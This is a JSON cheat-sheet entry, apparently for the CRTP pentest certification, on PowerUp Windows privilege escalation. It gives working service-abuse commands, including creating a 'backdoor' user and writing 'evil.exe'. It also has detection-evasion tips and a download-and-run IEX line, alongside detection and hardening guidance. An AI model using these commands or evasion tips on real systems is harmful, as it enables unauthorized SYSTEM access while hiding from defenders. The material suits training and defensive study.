@@ -1,0 +1,108 @@
+{
+  "id": "crtp-powerup",
+  "name": "PowerUp Local Privilege Escalation",
+  "command": "Invoke-AllChecks",
+  "description": "Run all PowerUp checks to identify local privesc vectors: unquoted service paths, weak permissions, AlwaysInstallElevated, autologon credentials.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Local PrivEsc",
+  "type": "command",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "source": "CRTP",
+  "opsec": "quiet",
+  "mitre": [
+    "T1574.009",
+    "T1574.007",
+    "T1548.002"
+  ],
+  "tools": [
+    "PowerUp"
+  ],
+  "tags": [
+    "powerup",
+    "privesc",
+    "local",
+    "service",
+    "alwaysinstallelevated"
+  ],
+  "steps": [
+    {
+      "label": "Load PowerUp",
+      "command": ". C:\\Tools\\PowerUp.ps1"
+    },
+    {
+      "label": "Run all checks",
+      "command": "Invoke-AllChecks"
+    },
+    {
+      "label": "Abuse service binary path",
+      "command": "Invoke-ServiceAbuse -Name '<service_name>' -UserName '<domain>\\<user>'"
+    },
+    {
+      "label": "Check AlwaysInstallElevated",
+      "command": "Get-RegistryAlwaysInstallElevated"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Run all checks and save",
+      "command": "Invoke-AllChecks | Out-File C:\\Temp\\powerup_results.txt"
+    },
+    {
+      "label": "Abuse weak service permission",
+      "command": "Invoke-ServiceAbuse -Name 'VulnSvc' -UserName 'corp\\backdoor'"
+    },
+    {
+      "label": "Write service binary",
+      "command": "Write-ServiceBinary -Name 'VulnSvc' -Path 'C:\\Windows\\Temp\\evil.exe'"
+    },
+    {
+      "label": "Check AlwaysInstallElevated reg",
+      "command": "Get-RegistryAlwaysInstallElevated"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-credential-dumping",
+      "note": "Dump credentials after gaining SYSTEM",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-gpo-abuse",
+      "note": "Check for GPO misconfiguration",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-jenkins-abuse",
+      "note": "Jenkins abuse for service account creds",
+      "rel": "alternative"
+    }
+  ],
+  "notes": "Key findings: unquoted paths, CanRestart service misconfigs, AlwaysInstallElevated, cached Autologon creds.",
+  "references": [
+    {
+      "title": "CRTP - Local PrivEsc with PowerUp",
+      "url": "https://www.alteredsecurity.com/adlab"
+    }
+  ],
+  "defense": {
+    "why_it_works": "PowerUp enumerates common Windows local privilege escalation misconfigurations: unquoted service paths with spaces (path injection), writable service binaries (replace binary = code execution as SYSTEM), AlwaysInstallElevated MSI registry keys (run MSI as SYSTEM), weak service DACLs (reconfigure service to run custom binary), and modifiable registry keys for services. These are common in enterprise environments due to poor installation practices.",
+    "prerequisites": "Standard user or low-priv domain user on a Windows host. PowerShell execution. PowerUp.ps1 loaded (in-memory or from disk). No WDAC/AppLocker blocking PowerShell.",
+    "impact": "T1574.009 Hijack Execution Flow: Path Interception by Unquoted Path + T1574.007 Hijack Execution Flow: Path Interception by PATH Environment Variable + T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control. Escalates from standard user to SYSTEM or local admin via service/MSI misconfigurations. Combined with a domain user account on a workstation, achieves local admin then uses for lateral movement.",
+    "detection": "Event 4104 SBL: Invoke-AllChecks or PowerUp function names. Event 4688: unusual service binary replacement (new executable written to service path). Event 4688: msiexec.exe spawning cmd/PowerShell (AlwaysInstallElevated abuse). SIEM: service binary hash change (file integrity monitoring). Sysmon Event 11: file write to service binary path from non-admin user.\nUnusual modifications to service binary paths, registry keys, or DLL load paths resulting in alternate execution flow; suspicious file writes into system directories; processes loading libraries from abnormal paths (DET0218/AN0609). Adversary manipulation of shared library paths, environment variables, or replacement of service binaries; suspicious modifications to /etc/ld.so.preload, service config changes, or file writes replacing existing executables (AN0610). Abuse of DYLD_INSERT_LIBRARIES or hijacking framework paths; processes invoking abnormal dylibs, modified plist files, or persistence entries pointing to altered binaries (AN0611).",
+    "artifacts": "Event 4104: PowerUp/Invoke-AllChecks | Sysmon Event 11: file written to C:\\Program Files\\... service binary | Event 4697: new service installed | Event 4688: service binary spawning cmd.exe as SYSTEM | Registry change: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated",
+    "prevention": "Fix unquoted service paths: use quotes in all service ImagePath values (sc config ServiceName binpath= '\"C:\\Program Files\\...\\service.exe\"'). Restrict write permissions on service binary directories to Administrators only. Disable AlwaysInstallElevated GPO: Computer Config \u2192 Windows Settings \u2192 Security Settings \u2192 Local Policies \u2192 Security Options. Enable PowerShell Constrained Language Mode. Use Invoke-PrivescAudit regularly to find and fix misconfigs before attackers do.\nApplication Developer Guidance: Include hash values in manifest files to prevent side-loading of malicious libraries.\nAudit: Use auditing tools to detect hijacking opportunities; use sxstrace.exe to check manifest files; find and eliminate path interception weaknesses; clean up old Registry keys after software uninstalls.\nBehavior Prevention on Endpoint: Block sequences of indicators related to process injection/memory tampering.\nExecution Prevention: Use application control to block libraries loaded by legitimate software.\nRestrict File and Directory Permissions: Install software in write-protected locations; set directory access controls to prevent file writes to search paths.\nRestrict Library Loading: Disallow remote DLL loading; enable Safe DLL Search Mode (HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode).\nRestrict Registry Permissions: Ensure proper permissions on Registry hives to prevent modification of keys for system components.\nUpdate Software: Regular patching for DLL side-loading vulnerabilities.\nUser Account Control: Configure UAC to deny elevation requests; enable installer detection.\nUser Account Management: Limit privileges to interact with services; deny execution from user directories (Downloads, temp folders).",
+    "evasion": "Run PowerUp from memory (IEX) to avoid on-disk detection. Use obfuscated function names to avoid SBL signatures. Target non-Sysmon monitored hosts. Replace service binary, wait for scheduled restart instead of manually restarting (avoids immediate detection).",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1574/009/",
+      "https://attack.mitre.org/techniques/T1574/007/",
+      "https://attack.mitre.org/techniques/T1548/002/"
+    ],
+    "misconfiguration": "AlwaysInstallElevated enabled in registry (both HKLM and HKCU). Service binary directories writable by standard users. Unquoted service paths with spaces in directory names. Service DACLs allow standard users to reconfigure services.",
+    "vulnerable_config": "# AlwaysInstallElevated enabled (BOTH keys must be set for exploitation):\n(Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer').AlwaysInstallElevated  # 1\n(Get-ItemProperty 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer').AlwaysInstallElevated  # 1\n# Both = 1 \u2192 MSI files run as SYSTEM = CRITICAL\n\n# Unquoted service path with space:\nsc qc 'Vulnerable Service'\n# BINARY_PATH_NAME: C:\\Program Files\\Some Company\\service.exe\n# \u2192 Windows tries: C:\\Program.exe, C:\\Program Files\\Some.exe, etc.\n\n# Writable service binary:\nicacls 'C:\\Program Files\\VulnApp\\service.exe'\n# Everyone:(F) \u2192 anyone can replace the binary",
+    "secure_config": "# Disable AlwaysInstallElevated via GPO:\n# Computer Config \u2192 Admin Templates \u2192 Windows Components \u2192 Windows Installer\n# \u2192 Always install with elevated privileges: Disabled\n# HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 0\n\n# Fix unquoted service paths:\nGet-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '\"' -and $_.PathName -match ' '} | ForEach-Object {\n  $quoted = '\"' + $_.PathName + '\"'\n  sc.exe config $_.Name binpath= $quoted\n}\n\n# Fix service binary permissions:\n# icacls 'C:\\Program Files\\VulnApp\\service.exe' /inheritance:d\n# icacls 'C:\\Program Files\\VulnApp\\service.exe' /remove 'Everyone'\n# icacls 'C:\\Program Files\\VulnApp\\service.exe' /grant:r 'SYSTEM:(F)' 'Administrators:(F)'\n\n# Regular PrivEsc audit:\nIEX (New-Object Net.WebClient).DownloadString('https://internal-repo/PowerUp.ps1')\nInvoke-AllChecks | Where-Object {$_.AbuseFunction} | Format-List"
+  }
+}
